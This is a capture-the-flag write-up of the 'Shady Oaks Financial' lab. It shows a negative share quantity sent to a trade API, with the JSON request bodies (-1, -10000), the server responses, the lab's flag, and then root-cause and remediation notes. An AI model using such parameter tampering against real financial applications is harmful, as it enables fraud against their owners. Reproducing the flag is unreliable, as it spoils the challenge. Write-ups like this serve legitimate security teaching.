# BugForge — Shady Oaks Financial

## Challenge Information

| Field          | Details              |
| -------------- | -------------------- |
| **Challenge**  | Shady Oaks Financial |
| **Category**   | Business Logic       |
| **Difficulty** | Easy                 |
| **Hint**       | `Broken Logic`       |
| **Target**     | `/api/trade`         |

---

## Description

The challenge involves a stock trading application where the trade form accepts a user-supplied share quantity.

The hint was:

> **"Broken Logic"**

The additional clue indicated:

> **"The trade form trusts the quantity you send."**

This suggested testing whether the server properly validates the `shares` parameter.

---

## Initial Trade

I first performed a normal stock purchase through the web interface.

The application sent the following request:

```http
POST /api/trade
Content-Type: application/json
Authorization: Bearer <JWT>
```

Request body:

```json
{
  "stock_id": 2,
  "shares": 1,
  "action": "buy"
}
```

The server responded:

```json
{
  "message": "Stock purchased successfully",
  "transaction_id": 4,
  "shares": "1.0000",
  "price": 141.91,
  "total_cost": "141.91",
  "new_balance": "858.09"
}
```

The normal calculation was:

```text
1 × $141.91 = $141.91
```

The balance decreased accordingly.

---

## Testing the `shares` Parameter

Since the hint specifically mentioned that the application trusts the quantity sent, I intercepted the request using **Burp Suite** and modified only the `shares` value.

I first changed:

```json
{
  "stock_id": 2,
  "shares": -1,
  "action": "buy"
}
```

The server accepted the request.

Response:

```json
{
  "message": "Stock purchased successfully",
  "transaction_id": 6,
  "shares": "-1.0000",
  "price": 143.98,
  "total_cost": "-143.98",
  "new_balance": "1145.10"
}
```

This confirmed the vulnerability.

Instead of rejecting the negative quantity, the server calculated:

```text
143.98 × -1 = -143.98
```

The negative total caused the balance to **increase** instead of decrease.

---

## Exploitation

I then tested progressively larger negative quantities.

The application continued accepting them until reaching the challenge's threshold of:

```text
-10000
```

The final request was:

```http
POST /api/trade
Content-Type: application/json
Authorization: Bearer <JWT>
```

```json
{
  "stock_id": 2,
  "shares": -10000,
  "action": "buy"
}
```

The server returned:

```json
{
  "message": "Stock purchased successfully",
  "transaction_id": 9,
  "shares": "-10000.0000",
  "price": 144.74,
  "total_cost": "-1447400.00",
  "new_balance": "15923983.30",
  "tier": "platinum",
  "flag": "bug{6qAX8egs4XGKrzjdKUf6X4oDxizVVyDX}"
}
```

The calculation was:

```text
-10,000 × $144.74 = -$1,447,400
```

Because the application failed to validate that the quantity was positive, this negative transaction caused the account balance to increase dramatically.

The increased balance triggered the **Platinum** tier and revealed the flag.

---

## Root Cause

The vulnerability is caused by insufficient server-side validation of the `shares` parameter.

The application should have enforced a condition such as:

```text
shares > 0
```

Instead, it trusted the value supplied by the client.

Conceptually, the vulnerable calculation behaved like:

```text
total_cost = price × shares
new_balance = balance - total_cost
```

With a negative quantity:

```text
total_cost = $144.74 × -10000
           = -$1,447,400
```

Then:

```text
new_balance = balance - (-$1,447,400)
            = balance + $1,447,400
```

This allowed the user to artificially increase their balance.

---

## Vulnerability Classification

### Broken Business Logic

The application assumes that the client will provide a valid positive quantity but does not enforce this assumption on the server.

Relevant security principle:

> **Never trust client-side input for security-sensitive business operations.**

The `shares` value should be validated server-side before performing any financial calculation or modifying the user's account.

---

## Impact

An attacker could potentially:

* Submit negative share quantities.
* Manipulate the resulting transaction amount.
* Increase their account balance.
* Reach privileged account tiers based on the manipulated balance.
* Trigger functionality or rewards that depend on account balance.

In a real financial application, this type of flaw could result in unauthorized financial manipulation.

---

## Remediation

The server should validate the `shares` parameter before processing the transaction.

For example:

```javascript
if (!Number.isFinite(shares) || shares <= 0) {
    return res.status(400).json({
        error: "Invalid share quantity"
    });
}
```

Additional validation should include:

* Reject negative quantities.
* Reject zero quantities.
* Validate that the value is numeric.
* Enforce reasonable maximum quantities.
* Validate that the user has sufficient funds.
* Validate that the user owns sufficient shares when selling.
* Perform all financial calculations server-side.
* Never rely on frontend validation alone.

A secure implementation should reject:

```text
-10000
-1
0
```

and only process valid quantities within the application's permitted limits.

---

## Tools Used

* **Firefox**
* **Burp Suite**
* **BugForge Shady Oaks Financial lab**

---

## Exploitation Flow

```text
Trade normally
      │
      ▼
Capture POST /api/trade
      │
      ▼
Identify `shares` parameter
      │
      ▼
Change shares = -1
      │
      ▼
Server accepts negative quantity
      │
      ▼
Negative total_cost
      │
      ▼
Account balance increases
      │
      ▼
Increase quantity to -10000
      │
      ▼
Platinum tier achieved
      │
      ▼
Flag revealed
```

---

## Flag

```text
bug{6qAX8egs4XGKrzjdKUf6X4oDxizVVyDX}
```

## Conclusion

The Shady Oaks Financial challenge demonstrates a **business logic vulnerability caused by missing server-side validation**.

The application trusted the `shares` value supplied by the client. By supplying a negative quantity, the transaction calculation became negative, causing the user's balance to increase instead of decrease.

Using:

```json
{
  "stock_id": 2,
  "shares": -10000,
  "action": "buy"
}
```

triggered the Platinum tier and revealed the flag.